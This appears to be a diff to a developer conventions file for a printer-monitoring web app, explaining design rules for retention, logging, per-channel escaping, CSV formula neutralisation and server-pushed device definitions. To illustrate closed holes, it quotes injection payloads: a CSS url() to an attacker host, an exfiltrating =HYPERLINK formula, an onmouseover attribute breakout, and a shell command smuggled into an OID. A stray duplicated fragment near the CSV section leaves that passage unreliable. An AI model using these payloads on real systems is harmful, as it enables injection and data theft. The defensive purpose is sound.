@@ -89,16 +89,41 @@ enforced; none of them is optional.
 
 ## Layout
 - `central/` — FastAPI app, models, worker, dashboard, notification channels.
-  - `api/` — JSON API routers: `ingest`, `management`, `reporting`, `exports`.
-  - `worker/` — APScheduler jobs (heartbeat, alerts, maintenance, forecast).
+  - `api/` — JSON API routers: `ingest`, `management`, `reporting`, `exports`,
+    `scim` (SCIM 2.0 provisioning/deprovisioning, off unless configured).
+  - `worker/` — APScheduler jobs (heartbeat, alerts, maintenance, forecast,
+    retention, directory sync, event delivery, collector-lease takeover).
   - `channels/` — pluggable `NotificationChannel` impls (email, slack, teams,
     freescout, generic webhook). Attachments supported on email for reports.
+    Each owns its **own** escaping — see the conventions; there is deliberately
+    no shared `escape()`.
+  - `events/` — the **typed, signed outbound event bus**: `catalogue.py` (what
+    may ever be sent, versioned per type), `signing.py` (the HMAC scheme),
+    `destinations.py` (the SSRF boundary), `emit.py` (recording + fan-out and
+    the tenancy invariant), `delivery.py` (the wire envelope and the retry
+    sweeper, reusing the notification machinery rather than growing a second).
+  - `billing.py` / `money.py` — cost-per-page pricing over the meter series, and
+    the `Decimal`-end-to-end money type that makes it exact on SQLite too.
+  - `reorder.py` — supply reorder **recommendations**, computed on read, stored
+    nowhere. Recommend-only is structural, not a matter of discipline.
+  - `supply_yield.py` — **yield-gap / non-OEM detection**: pages per cartridge,
+    measured between replacements, against what a cartridge should deliver.
+    Measurements persist (`supply_cycles`); the verdict is computed on read.
+  - `retention.py` — raw-reading retention + the daily rollup.
+  - `collector.py` — **collector redundancy**: the per-subnet lease that lets a
+    standby agent take over and proves two never collect at once.
+  - `branding.py` — per-client white-label resolution and its two sinks.
+  - `csv_safe.py` — CSV formula neutralisation, shared by every export.
+  - `logging_config.py` — the single `configure_logging()` both processes call.
   - `dashboard/` — HTMX/Jinja:
     - `routes.py` — overview / client / printer drill-downs, approvals, alerts,
-      account, **customer portal** (`/portal` for client_readonly users).
+      account, **fleet-wide printer search**, security posture, reorder,
+      **customer portal** (`/portal` for client_readonly users).
     - `manage.py` — CRUD for clients, sites, printers, agents, subnets, users,
-      **maintenance schedules** + **audit log** viewer.
+      **maintenance schedules**, **alert rules** + **audit log** viewer.
     - `people.py` — **end users, groups, and printer assignment** (`/manage/people`).
+    - `billing.py` — rate cards and invoice preview/CSV (`/manage/billing`).
+    - `events_routes.py` — event subscriptions, secrets, delivery log.
     - `settings_routes.py` — grouped settings tabs (Branding / Notifications /
       Alerts & Reports / Polling & SNMP / Authentication / Agents).
     - `backup_routes.py` — admin-only DB backup & restore.
@@ -129,6 +154,11 @@ enforced; none of them is optional.
     `DirectorySnapshot`), `entra.py` / `google.py` / `ad.py`, `registry.py`
     (builds a provider from a connection row; the one place a secret is
     decrypted), `sync.py` (applies a snapshot).
+  - `device_definitions.py` — the **device/model definition** data language and
+    its validator. Vendored into the agent (`printer_nanny_agent.definitions`)
+    and held to it by `tests/test_device_definitions_parity.py`, which asserts
+    the *source below the docstring* is identical as well as the behaviour.
+  - `dashboard/definitions.py` — the operator surface at `/manage/definitions`.
   - `snmp_parse.py` — brand-agnostic SNMP supply/level parsing (shared w/ agent).
   - `snmp.md` — Printer-MIB OID reference.
   - `static/` — **vendored** `tailwind.css` + `htmx.min.js`, served at `/static`.
@@ -152,13 +182,27 @@ enforced; none of them is optional.
     what it can do (`SUPPORTS_VENDOR_DRIVERS`, an optional `make_runner`) rather
     than the orchestrator branching on `sys.platform`, so a Mac neither builds a
     PowerShell runner nor unpacks a Windows driver archive it cannot stage.
+  - `definitions.py` + `providers/definitions.py` — the agent half of
+    server-pushed model definitions: the vendored validator, the signed local
+    cache, and the provider that applies them. Registered **last** in the
+    registry, which is what makes the precedence rule true rather than merely
+    documented.
   - `mdns.py` — optional Bonjour/DNS-SD discovery (`agent[mdns]` extras).
   - `updater.py` — self-update via `update_agent` command; writes
     `.pn-update-result.json` so the dashboard can show success/failure.
-- `migrations/` — Alembic environment + versions (0001 → 0033). Revision 0001 is
+- `migrations/` — Alembic environment + versions (0001 → 0043). Revision 0001 is
   `Base.metadata.create_all()`, so **the ORM metadata is what builds a fresh DB** —
   an index declared only in a later migration is silently absent on new installs.
   Declare indexes in the model's `__table_args__` and mirror them in the migration.
+  **The chain must stay a single walkable line** — one base, one head, no forks,
+  no cycles, no dangling parent — and `tests/test_migration_chain.py` asserts all
+  five. This is not tidiness: a fork makes alembic report "Multiple head
+  revisions are present" and **refuse to upgrade at all**, while nearly every
+  test still passes, because most fixtures build their schema with `create_all`
+  and revision 0001 *is* `create_all`. Ten revisions authored concurrently is
+  exactly how a fork happens, so do not pin a parent by name in a test either —
+  revisions land in a different order than their assigned slots, and pinning
+  names a coordination artifact rather than the property that has to hold.
 - `deploy/` — Caddyfile, installer scripts (`install-agent.sh`/`.ps1`,
   `install-workstation-macos.sh`), sample systemd unit and launchd plists,
   `macos-pkg/` (the `preinstall`/`postinstall` the `.pkg` runs as root — the same
@@ -167,15 +211,30 @@ enforced; none of them is optional.
   defects it found) and `MACOS-CLIENT-TESTING.md` (real-CUPS verification, the
   `.pkg` procedure, and the 2026-07-30 real-Mac run — done items marked and dated,
   the rest still open).
-- `tests/` — pytest suite (~1770 tests, serial, on Postgres-less SQLite).
-  **Quote the machine with the number**: ~2.5min on a GitHub `ubuntu-latest`
-  runner, ~6-7min on a 4-vCPU container. A bare figure is unfalsifiable, which
-  is how a run on a *busy* box (9min) gets reported as a regression against a
-  documented one — that happened. ~80% of the wall clock is
-  `create_all`/`drop_all` rebuilding the schema per fixture (measured: 282s of
-  353s across 744 rebuilds), so the total tracks single-core speed and is the
-  first thing to attack if it ever needs to be faster. Password hashing, the
-  obvious suspect, is **1.8%** — measured, after it was assumed.
+- `tests/` — pytest suite, serial, on SQLite locally and **also on real Postgres
+  in CI** (`.github/workflows/postgres.yml`).
+  **Quote the machine with the number**, always — a bare figure is
+  unfalsifiable, which is how a run on a *busy* box (9min) once got reported as
+  a regression against a documented one.
+  - **Measured 2026-08-03 on `claude/completion-program` @ `b970ba5`**, Apple M2
+    Max (12 cores), macOS 26.5.2, Python 3.9.6, unpiped, both backends:
+    - SQLite: **2811 passed / 39 skipped in 390s (6:30)**, exit 0.
+    - Postgres 16 (throwaway container): **2825 passed / 25 skipped in 459s
+      (7:39)**, exit 0.
+    Both collect 2850. The skip counts differ *by design* and the totals
+    reconcile: `postgres_only` tests skip on SQLite and `sqlite_only` tests skip
+    on Postgres. A run where both numbers match is the thing to distrust — it
+    means one of the two marks stopped being applied.
+  - The GitHub-runner (~2.5min) and 4-vCPU-container (~6-7min) figures below
+    this line were measured at ~1770 tests and have **not** been re-measured
+    since the suite grew by ~45%; treat them as stale, not as targets.
+  - Likewise **not re-measured**: that ~80% of the wall clock is
+    `create_all`/`drop_all` rebuilding the schema per fixture (282s of 353s
+    across 744 rebuilds), and that password hashing is **1.8%**. Both were
+    measured at the old size. The *shape* of the finding is what to carry
+    forward — the total tracks single-core speed, and the schema rebuild is the
+    first thing to attack if it ever needs to be faster; the obvious suspect was
+    not the culprit.
   `test_compose_deployment.py` / `test_install_update.py` cover the deployment
   contract above; both skip cleanly where the docker CLI is absent.
   `test_macos_deployment.py` does the same for the LaunchDaemon plist and its
@@ -188,11 +247,81 @@ enforced; none of them is optional.
   annotations`) so it runs on the local system Python too.
 - Sync SQLAlchemy 2.0 (`Mapped[]` style) + Alembic. Sessions via
   `central.db.SessionLocal` / the `get_db` FastAPI dependency.
+- **A `server_default` must render per dialect, and a boolean is where that
+  bites.** `server_default=text("1")` on a `Boolean` renders as an unquoted
+  integer; SQLite accepts it, Postgres refuses it outright —
+  `psycopg.errors.DatatypeMismatch: column "allow_breakthrough" is of type
+  boolean but default expression is of type integer`. Since revision 0001 is
+  `create_all()`, the ORM declaration *is* what builds a fresh database, so this
+  was not a cosmetic declaration issue: `alembic upgrade head` against a fresh
+  Postgres could not create the schema at all, and had not been able to since
+  0.12.0. Use `true()`/`false()`, which render `1` on SQLite and `TRUE` on
+  Postgres. The whole suite passed over it because the whole suite ran on
+  SQLite — the same zero-Postgres blindness this repo already paid for four
+  times on the Windows client, arrived at from the database side.
+  `tests/test_postgres_bootstrap.py` compiles the real metadata against the
+  Postgres *dialect* rather than requiring a live server (a test that needs
+  Postgres gets skipped exactly where it is needed) and asserts on **rendered
+  DDL**, so it catches every spelling that produces a numeric default rather
+  than one blacklisted idiom.
+- **`DATABASE_URL` must never travel through ConfigParser.** `migrations/env.py`
+  deliberately does *not* call `config.set_main_option("sqlalchemy.url", …)`:
+  that writes through alembic's ConfigParser, whose `BasicInterpolation` reads
+  `%` as a directive, so a percent-encoded character in a password (`p%40ss` is
+  simply how you put an `@` in a Postgres URL) raises `ValueError: invalid
+  interpolation syntax` while `env.py` is still *importing* — before a single
+  migration runs, and equally for `current`, `history` and the offline `--sql`
+  path. `docker-compose.yml` builds `DATABASE_URL` straight out of
+  `POSTGRES_PASSWORD` and the api container boots with `alembic upgrade head &&
+  …`, so a strong password containing `@`, `/` or `#` bricked the container on
+  first boot with a stack trace naming ConfigParser and never the password. The
+  line is *deleted* rather than escaped to `%%`, because nothing reads the
+  option — both paths in that file carry the URL themselves — and leaving a live
+  ConfigParser round trip in the path of a credential just waits for the next
+  person to write `set_main_option`.
 - API is versioned under `/api/v1`. Agents authenticate with a per-agent API key
   (`Authorization: Bearer <key>`, hashed at rest). Dashboard users use signed
   sessions + roles (`admin` / `tech` / `client_readonly`).
-- Time-series lives in `readings`, append-only and indexed by `(printer_id, ts)`.
-  On Postgres a BRIN index on `ts` keeps range scans cheap (migration 0002).
+- Time-series lives in `readings`, append-only, with a composite `(printer_id,
+  ts)` index — every hot query on it is "one printer, a time range". That index
+  is **new in 0034**: this line asserted it for a long time while the schema had
+  only two single-column indexes, so Postgres read every reading a printer had
+  ever produced and filtered by `ts`. Measured on 300k rows / 500 printers: 317
+  buffers with it, 593 without. On Postgres a BRIN index on `ts` keeps range
+  scans cheap (migration 0002). Neither `readings` nor anything else is
+  **partitioned** — `models.Reading` and `db.create_all` both used to claim
+  Postgres range-partitioned it monthly, and it never has; 0002 deferred
+  partitioning explicitly and shipped BRIN instead.
+- **Retention is a rollup, and deletion is opt-in** (`central/retention.py`,
+  `reading_rollups`). Raw readings are kept `retention.raw_days` (90) and then
+  collapse to one row per printer per UTC day, kept forever. Four rules, each
+  because its opposite loses data quietly:
+  - **The rollup UPSERT and the DELETE of the rows it summarises are one
+    transaction**, so there is no ordering to get wrong — the rollup commits iff
+    the readings are gone, and a crash re-does that printer-day from untouched
+    raw rows. `retention.delete_enabled` ships **False**; every pass that
+    deletes writes a `readings.pruned` audit row, and a refusal writes
+    `readings.prune_refused`.
+  - **Deletion is by explicit id, never by predicate.** `ReadingIn.ts` is
+    client-supplied, so an agent can backdate a push; re-issuing the range
+    predicate would destroy a row inserted between the SELECT and the DELETE
+    without ever counting it. A straggler instead survives to the next pass, and
+    `raw_pruned` is what selects the write rule there — False recomputes the day
+    from the raw rows, True *merges*, because recomputing a pruned day would
+    keep the straggler and discard the day.
+  - **Work is bounded per cycle** (`retention.max_batches_per_cycle`). The
+    worker holds a single-leader lock, so one `DELETE` over 52M rows stalls
+    alerting for the whole fleet; each delete covers one printer-day. The job is
+    registered **last** in `JOBS` and needs no schedule: an idle pass is one
+    `MIN(ts)` index probe.
+  - **`retention.raw_days` has a floor computed from the forecast's own window**
+    (`min_raw_days()`), not a literal 30. Supply-runway estimates read raw
+    readings *only*, over 30 days; a shorter raw window starves every estimate
+    without failing anywhere. Below the floor the worker logs and uses the floor
+    — clamping in silence is indistinguishable from no guard. Rollups carry
+    per-supply levels they do not need today for the same reason: widening the
+    forecast window past 90 days would otherwise return the 90-day answer
+    forever, with nothing to grep.
 - SNMP is brand-agnostic via RFC 3805 Printer MIB. Vendor providers add real
   percentages where the standard MIB only reports buckets (Brother) or
   brand-tag/status-message scalars (HP, Lexmark, Xerox, Kyocera, Canon, Ricoh,
@@ -318,9 +447,92 @@ enforced; none of them is optional.
   severity skip or unconfigured dry-run terminates as `DeliveryStatus.skipped`
   rather than `delivered`. When adding a channel or an early-return, anything
   that reports success without transmitting **must** set `sent=False`.
+- **A channel must read its credential through `setting()`, not from env.**
+  `active_channels` builds every Settings-page channel with `config={}` and
+  passes the operator's values in `runtime`, so a channel that reads
+  `self.config` and then falls through to `central.config.settings` skips the
+  only layer the UI ever writes. `TeamsChannel._webhook` did exactly that: an
+  operator who enabled Teams and pasted a webhook URL got a **permanent silent
+  dry-run** — `ok=True`, nothing transmitted, and the setting page apparently
+  working. `setting()` is the shared helper that spells the precedence once
+  (row config → runtime → default); Slack and the generic webhook always used
+  it. The `sent=False` rule above is what kept this honest rather than
+  fraudulent — the dry-run was recorded as `skipped`, not `delivered` — but it
+  is a rule about *reporting*, and it cannot make a misconfigured read deliver
+  anything. Test the wiring through `active_channels`, never by constructing the
+  channel directly: direct construction is the one path that never had the bug.
+- **Occurrence-rate alerting asks a different question from every other rule,
+  and that changes what damping means.** `AlertConditionType.occurrence_rate`
+  counts matching `printer_events` in a rolling window (`alert_rules.
+  window_minutes`, `match_code`, `match_min_severity`; `threshold` is the count
+  N) — "not every jam, but ten jams a day". `printer_events` is the *only*
+  counting source, and it already has the right shape: `_reconcile_events`
+  refreshes a standing snmp_alert condition **in place** and inserts a new row
+  only once it has cleared, so a printer jammed for a day is one occurrence and
+  a printer that jams and is cleared twelve times is twelve. Four rules follow,
+  and each exists because the alert spine's existing damping was built for
+  *state* conditions:
+  - **The count is the alert's content, so dedupe must not freeze it.** A live
+    rate alert's detail is rewritten each cycle with the current count (never
+    re-notified — escalation already covers "still not fixed"). Without that,
+    an alert that opened at 10/day sits in front of the operator saying 10 while
+    the printer is at 60: the alert asserting something untrue, not merely stale.
+  - **The flap cooldown is capped at the rule's own window.** Folding claims
+    "same incident", and for a rate condition that is true exactly while the two
+    firings count overlapping events. A 10-minute "5 jams" rule under the shipped
+    30-minute cooldown would otherwise have a genuinely new burst — five fresh
+    jams sharing not one event with the previous alert — folded in silently, the
+    damping mechanism defeating the feature that exists to measure repetition.
+    The cap can only ever *shorten*; a 24h-window rule keeps the operator's 30m.
+  - **Hysteresis is mandatory here, not optional.** A rolling window sheds
+    occurrences by itself, so with no margin every rate alert resolves the moment
+    the oldest event ages out and re-opens on the next one — flapping by
+    construction. `alerts.occurrence_clear_margin_pct` (default 25) holds it open
+    until the count falls that far below N, and the hold is stated on the alert
+    rather than being silent.
+  - **The window is bounded at both ends.** A rule with no window is skipped
+    rather than defaulted, and `OCCURRENCE_MAX_WINDOW_MINUTES` clamps in the
+    evaluator as well as the form — an unwindowed count is the append-only
+    full-table scan `FORECAST_HISTORY_WINDOW_DAYS` already had to be walked back
+    from. Counting is ONE grouped query per rule (not per printer), joined to
+    `printers` for scope rather than an `IN (:ids)` list that overruns SQLite's
+    999-variable limit on a real fleet. `match_code` is escaped before it reaches
+    a `LIKE`: an unescaped `%` silently turns a narrow rule into "match
+    everything", which fails *open*.
+  Alert rules also finally have an operator surface (`/manage/alert-rules`).
+  There was none before — the four defaults came from `seed.py` and the only way
+  to change a threshold was SQL, which is survivable when a condition is one
+  number and not when it is three decisions with no defensible default.
 - Secret-typed settings + SNMPv3 USM passwords are **encrypted at rest** with
   a Fernet key derived from `SECRET_KEY`. Lazy migration: legacy plaintext is
   swept into encrypted form on every save and at api startup.
+- **Logging is configured in one place (`central/logging_config.py`), and the
+  verbosity knob deliberately cannot reach a dependency.** The worker called
+  `logging.basicConfig` in its `main()`; the api configured logging **nowhere**,
+  so in the api container every `log.info()` under `central/` went to the floor
+  and warnings arrived through `logging.lastResort` — bare `%(message)s`, no
+  timestamp, no level, no logger name. Verified before/after against a real
+  `uvicorn central.main:app`: a self-registration that plainly *happened* (agent
+  created, HTTP 200) logged **nothing**. Both processes now call
+  `configure_logging()`; two `basicConfig` copies are exactly the drift this
+  repo keeps paying for. Three properties are load-bearing. **`LOG_LEVEL` moves
+  `central`/`printer_nanny` only, never root** — `httpx` logs the full request
+  URL at INFO and a Slack / Teams / webhook URL *is* the credential, and
+  SQLAlchemy logs bound parameters (password hashes, Fernet ciphertext) at
+  DEBUG, so an allowlist makes both impossible rather than filtered and a
+  dependency added later cannot reopen it. Root keeps its WARNING default, and a
+  record still reaches an ancestor's handlers regardless of that ancestor's
+  level (`Logger.callHandlers` consults handler levels only) — which is what
+  lets our INFO out while a library's stays in. **It does not fight uvicorn**:
+  `Config.__init__` applies its `dictConfig` before `load()` imports the app and
+  names only the `uvicorn*` loggers (no `root` key, `propagate: False`), so
+  configuring at import neither clobbers nor duplicates. **`LOG_LEVEL` is env,
+  not a DB-backed setting**, because the first thing worth logging is a database
+  that will not answer. A typo costs a preference, never a boot.
+  `tests/test_logging_config.py` asserts on captured *output* — the failure
+  being guarded is a configuration call that runs and still emits nothing — and
+  one of its subprocess cases reproduces the old broken state so the suite fails
+  if the wiring is reverted.
 - **Audit trail** — every login (incl. failures with attempted username),
   settings change (key names only), user/agent/printer/subnet CRUD, approvals,
   alert acks, agent updates, portal reports, backup downloads / restores are
@@ -337,6 +549,143 @@ enforced; none of them is optional.
   trimmed view of their fleet with friendly names, "your supplies last ~Nd"
   forecasts, open issues, and a "Report a problem" form that opens a FreeScout
   ticket via the existing channel (or falls back to alert-email recipients).
+- **Per-client white-label** (`clients.brand_name` / `brand_logo_url` /
+  `brand_primary_color`, `central/branding.py`) overrides the global `app.*`
+  branding **per field** — an unset column inherits, so a client with nothing
+  configured renders exactly as before. It applies to the customer-facing
+  surface only: every page a `client_readonly` user reaches, plus
+  `/portal?client_id=N` when staff preview one. Staff pages keep the global
+  chrome, because a nav bar that turns into the customer's logo reads as "you
+  are inside their system". **Alert email, tickets and reports stay global** —
+  channels are shared across tenants and digests span several, so a message
+  branded as one customer is branded as the wrong one for everyone else on
+  that channel. Two sinks make this a security surface, not a cosmetic one:
+  `primary_color` lands in a CSS declaration, where escaping stops an
+  attribute breakout but not `red; background-image: url(https://attacker/)`,
+  so it is **validated against `#rgb`/`#rrggbb` on input and re-checked at
+  render**; and the logo is a file served from our own origin, so the **bytes
+  decide** (`sniff_image_type`, four raster formats), SVG is refused outright
+  as a script-carrying document, and anything already stored goes out with
+  `nosniff` + a sandboxing CSP. There is **one** uploader, shared with Settings
+  → Branding, storing into `app_assets` under `client:<id>:logo`; that row has
+  no FK, so deleting a client deletes it explicitly — SQLite reuses row ids and
+  the next client would otherwise inherit the logo. Serving is tenant-scoped
+  (404, never 403, so ids can't be probed).
+- **HTML escaping is not JS escaping**, and an inline event handler is a script
+  context wearing an attribute's clothes. A value interpolated into
+  `onsubmit="return confirm('Delete {{ name }}?')"` is autoescaped to `&#39;`
+  — and the HTML parser decodes that back to a quote *before* the attribute is
+  compiled as script, so the string literal closes and the rest executes. Pass
+  such values in a `data-` attribute and read them through `dataset` instead;
+  then they are only ever data. `client_manage.html` does this;
+  `tests/test_client_branding.py` asserts it. `events.html` takes the other
+  valid route — `'…' + {{ s.name|tojson }} + '…'` — since Jinja's `tojson`
+  emits `<`-style escapes that survive the attribute decode as data.
+  **All of these are now fixed** — zero `on*` attributes in any template
+  interpolate a Jinja expression, and `tests/test_template_js_injection.py`
+  scans for it so the count cannot grow again. (This paragraph read "fourteen
+  still interpolate raw — not yet fixed" long after they were, while a line
+  further down said "all 16 sites are now fixed". Two claims, one file,
+  opposite answers.)
+- **Escaping is per wire format; one shared `escape()` across the channels would
+  be the bug, not the fix.** Every channel receives the same device-controlled
+  strings (`printers.model`, `hostname`, `serial` off SNMP; portal free-text)
+  and each renders them in a different language, so each `build_payload` carries
+  its own `_esc`:
+  - **FreeScout** renders a thread body as raw HTML (`safe_raw_html`), so values
+    are entity-encoded there **per value, never on the assembled string** — the
+    `<br>` separators are ours and escaping afterwards would print them as
+    literal text. Its **subject is deliberately left alone**: Blade renders it
+    through an escaping echo, so encoding would double-encode and put
+    `Bob&#x27;s &amp; Co` in every ticket list and Subject line.
+  - **Slack** gets exactly three replacements (`&` first, then `<`, `>`) and
+    **not** `html.escape` — Slack decodes only those three and warns against
+    encoding more, so quote-escaping leaves a literal `&#x27;` in every printer
+    named after somebody's office. The hole being closed is real: `<!channel>`
+    pages an MSP's ops room, and `<https://evil|https://help>` forges a link the
+    team trusts because the monitoring bot sent it. Attachment **field values**
+    are escaped too, not just the top-level text.
+  - **Teams** connector cards render limited HTML *and* Markdown, so a value is
+    live markup twice: entity-encode, then backslash-escape `\ [ ]`. **The
+    backslash goes first** — otherwise `\[x](u)` yields a rendered backslash
+    plus a *live* link. Emphasis and headings are left alone; they restyle text
+    but never redirect it.
+  - **The generic webhook is verbatim on purpose.** It composes no document,
+    `json.dumps` encodes the value completely, and escaping would corrupt it for
+    a subscriber that stores or matches on it — that belongs at the
+    subscriber's own output boundary. Say so in the code, or it gets "hardened"
+    later.
+  - Escaping lives in `build_payload` at the wire boundary, **not** in the
+    `Notification`: `notification_payload()` freezes raw values for the retry
+    path, so encoding there would double-encode on every retry.
+  - The same pass fixed a device-driven *delivery outage* the audit had missed:
+    a multi-line HP `sysDescr` in `printers.model` reached the email `Subject`
+    header, `email.policy.default` correctly refuses CR/LF, the `ValueError`
+    escaped `build_message`, and every such alert recorded
+    `DeliveryStatus.failed` with no mail sent at all. **Refusing is not
+    handling.** To/From stay untouched — those are operator-configured addresses
+    and silently rewriting one is worse than refusing it.
+- **CSV: RFC 4180 quoting is not a defence, and a number is never touched.**
+  `csv.writer` escapes commas and quotes correctly and passes
+  `=HYPERLINK("http://evil/"&A1,"click")` through perfectly intact, whereupon
+  Excel, LibreOffice and Sheets all *evaluate* it — and the cells at risk are
+  `model`/`hostname`/`serial`/`brand`, i.e. bytes controlled by anyone who
+  controls a printer, landing in a billing CSV an MSP opens by hand.
+  `central/csv_safe.py` owns the one rule: `safe_writer()` is a drop-in for
+  `csv.writer` that neutralises **every** cell including the header, so a column
+  added later is covered by construction rather than by its author remembering.
+  Two decisions worth keeping: the numeric exemption is a **closed-form decimal
+  grammar, not `float()`** (which also accepts `-inf`, `-nan`, `-1_0`, none of
+  which is a number to a spreadsheet), because page counts and period deltas
+  legitimately start with `-` and escaping them breaks the arithmetic in the
+  spreadsheet the export exists to feed; and `None` exports as a **blank cell,
+  never the string "None"**, because the billing CSV relies on blank-not-zero to
+  avoid billing a meter the device never reported as zero.
+  compiled as script, so the string literal closes and the rest executes.
+  Escaping ran and did nothing. Pass such values in a `data-` attribute and read
+  them through `dataset`; then they are only ever data. **All 16 sites are now
+  fixed** (agents ×6, printer ×2, events ×2, maintenance, manage_users,
+  suppression, alert_rules, billing, definitions), and
+  `tests/test_template_js_injection.py` scans every template so a new one cannot
+  reintroduce the shape — the scan is the guard, the individual fixes are not.
+  Two things worth not re-learning:
+  - **`|tojson` is NOT the fix, and shipping it as one opened a second hole.**
+    It escapes `<`, `>`, `&` and `'` but **not** `"`, and it emits the JSON
+    string's own surrounding double quotes — so inside a *double-quoted*
+    attribute its first character **terminates the attribute** and everything
+    after it parses as more attributes on the tag. An event subscription named
+    `a" onmouseover="alert(1)` rendered a genuine `onmouseover` handler on the
+    form (verified against a real HTML parser). `tojson` is safe in a `<script>`
+    block or a single-quoted attribute, and nowhere else. The rule is therefore
+    a bright line — **no Jinja expression of any kind inside an `on*` handler** —
+    because "escape it correctly for the nested context" is a rule that gets got
+    wrong, and got wrong twice here.
+  - **Most of these were remotely triggerable, not self-XSS**, which was checked
+    rather than assumed and came out worse than it looked. `printer.ip` and
+    `subnet.cidr` are bare `str` on both the ingest schemas and the operator
+    forms — `ipaddress` is called only at *read* time, never as an input gate —
+    so an IP is arbitrary text an agent can push. `agents.name` embeds the
+    agent's **self-reported hostname** from claim-code redemption (`services.py`
+    calls it "machine-reported and therefore untrusted", length-caps it, and
+    does not character-restrict it). `users.username` is written straight from
+    the IdP payload when SCIM is on. Only the rate-card, schedule, window, rule
+    and definition names are purely operator-typed.
+  - The same class was swept for beyond `confirm()`: no `|safe`, no `Markup(`,
+    no `javascript:` URLs, no interpolation in any `<script>` block, and no
+    `hx-vals`/`hx-on*` anywhere. Two adjacent gaps were closed at the same time
+    — `app_branding` now re-checks `logo_url` through `safe_logo_url` (the
+    per-client path always did; the global one did not, and it renders on the
+    **pre-auth** login page), and `level_bar` coerces its percentage with
+    `| float` so the CSS sink is structurally safe rather than accidentally so.
+  - **Still open, and deliberately not decided here: there is no CSP on
+    dashboard HTML.** `main.py` sets no `Content-Security-Policy`,
+    `X-Frame-Options` or `X-Content-Type-Options`; the only CSP in the tree is
+    scoped to branding image assets. A CSP would have made every instance of
+    this bug class a no-op. The catch that makes it a real decision rather than
+    a missing header: this app's confirm dialogs *are* inline handlers, so
+    `script-src 'self'` breaks them and `'unsafe-inline'` would defeat the
+    point — adopting one means moving those handlers to a listener in a served
+    JS file first.
 - **Printer friendly names** (`printers.display_name`) are used everywhere a
   printer is named — dashboards, alert titles, recent activity, the weekly
   report. Operators set them in the printer edit form.
@@ -348,6 +697,21 @@ enforced; none of them is optional.
   Postgres: `pg_dump --format=custom` / `pg_restore --clean`. SQLite: streamed
   file copy + atomic replace. Restore is gated behind typed `RESTORE`
   confirmation.
+  - **libpq does not understand SQLAlchemy's `+driver` suffix**, and the failure
+    is silent in the worst way. A conninfo string that does not begin *exactly*
+    `postgresql://` or `postgres://` and contains no `=` is taken by libpq as a
+    bare **database name**, so host, port and user all fall back to defaults.
+    Handing `postgresql+psycopg://…` straight to `pg_dump --dbname` does not
+    error on the scheme — it quietly tries a local unix socket as the
+    container's OS user, fails with `role "root" does not exist`, and leaves a
+    **zero-byte** dump behind. Backup and restore had therefore never worked on
+    Postgres at all. `backup_routes.libpq_target()` is the one place that
+    rebuilds the DSN (`URL.create(drivername="postgresql", …)`, query params
+    preserved so a deployment pinning `sslmode=require` keeps it). It also moves
+    the password into **`PGPASSWORD`**, because the whole URL used to be one
+    argv element and `ps` discloses argv to every local user — the same rule
+    this project already enforces for the Windows service command line and the
+    macOS LaunchDaemon plist.
 - **Onboarding** (`/manage/onboard`) creates client → site → subnet → claim code
   in one transaction. Four mechanisms, each with a rule worth keeping:
   - **`subnets.trusted`** is the *only* path that puts a device in a tenant's
@@ -446,12 +810,233 @@ enforced; none of them is optional.
   wins would make a workstation's default printer depend on dict ordering.
   Inactive users resolve to **nothing** while keeping their rows, so
   deprovisioning takes effect immediately and history survives.
+- **Device definitions are DATA the agent interprets, never code it runs.** A
+  new printer model whose supply levels live only in a vendor-private OID used
+  to need a new *provider* — Python, in the agent package, shipped by a release.
+  `device_definitions` moves the model-specific part into a row an operator
+  writes at `/manage/definitions`, which agents fetch, cache and apply. The
+  rules that make that safe rather than merely convenient:
+  - **No regular expressions, ever**, and that is a design decision rather than
+    an omission. A pattern supplied by a definition runs on every agent in the
+    fleet, and there is no way to inspect an arbitrary pattern and prove it is
+    not catastrophically backtracking — so one bad row stalls the whole fleet at
+    once. Extraction is `text_between`, which slices between two **literal**
+    delimiters and is linear whatever an operator types. A definition carrying
+    `regex`/`pattern`/`re`/`eval`/… is refused *by name* so the message reads as
+    a decision. Same stance as the workstation client's PowerShell rule: make
+    the question moot instead of handling it.
+  - **Closed vocabulary, unknown keys refused, everything bounded.** Six decode
+    kinds; OIDs validated by a character loop (not a regex — this is the gate
+    that keeps `1.3.6; rm -rf /` out of an SNMP call); caps on payload bytes,
+    definition count, OIDs, map entries, string lengths and JSON depth. The
+    depth check is **iterative**, because a recursive one over hostile input
+    raises `RecursionError` from somewhere unrelated and the guard becomes the
+    failure.
+  - **Validated on ingest AND on the agent**, on receipt and on every cache
+    load. Central signs the feed, and a signature proves who produced bytes, not
+    that the bytes are safe — an agent must be able to defend itself against a
+    central it authenticates.
+  - **Built-ins run FIRST; a definition runs LAST and fills only.** This is the
+    precedence decision, and registration order in `providers/__init__.py` is
+    what enforces it. Built-in providers are hardware-proven; a definition is
+    data that has never executed anywhere, so it may fill a `level_pct` that is
+    still `None`, add a row nobody produced, and fill absent meters/status —
+    and may **not** replace a value a built-in established. `override_builtin`
+    is the deliberate exception (a built-in that decodes one model wrongly is
+    exactly what you want to fix without a release): default off, an operator
+    checkbox, audited, and every displaced field is named in `provider_trace` on
+    that printer's own detail page. The contract is "never **silently**", not
+    "never".
+  - **One definition per printer; an exact tie is refused.** Most specific wins
+    (model tag, then brand, then enterprise, compared as a tuple so a model
+    criterion always beats a brand one). Two definitions over one device's
+    supply rows is a coin flip whose losing side looks exactly like data — same
+    discipline as an ambiguous driver-package match. A definition with **no**
+    match criteria is refused outright: it would point one vendor's private MIB
+    at every printer in every client.
+  - **A changed feed carries the FULL set, not a delta.** A delta needs
+    tombstones, and a missed tombstone leaves a *withdrawn* definition running
+    on an agent forever — precisely the failure this design exists to prevent.
+    The version is a content digest, so an unchanged feed transfers nothing
+    (`{"version": v, "changed": false}`), which is the steady state on every
+    poll of every agent. Deletion changes the digest, so withdrawal actually
+    takes effect.
+  - **Scoped per agent.** Global definitions (hardware knowledge, `client_id IS
+    NULL`) plus those scoped to clients the agent actually collects for, so one
+    tenant's custom definition never reaches another's site. Note the trap the
+    schema hides: `UNIQUE(key, client_id)` does **not** stop duplicate *global*
+    keys, because SQL treats NULLs as distinct — a partial unique index over
+    `client_id IS NULL` is what enforces it, declared in both the model and the
+    migration.
+  - **Degrading is the default.** No definitions → `detect()` is False and the
+    provider is never entered, not even a trace row; the reading is byte-for-byte
+    what the pre-feature agent produced. A failed fetch, a refused signature or
+    a malformed feed keeps whatever is already active — failing *forward* into
+    "no definitions" would let anyone who can break the response turn the
+    feature off fleet-wide.
+- **The outbound event bus is the integration surface, and it never holds
+  commercial state** (`central/events/`). PSA integration was dropped on purpose
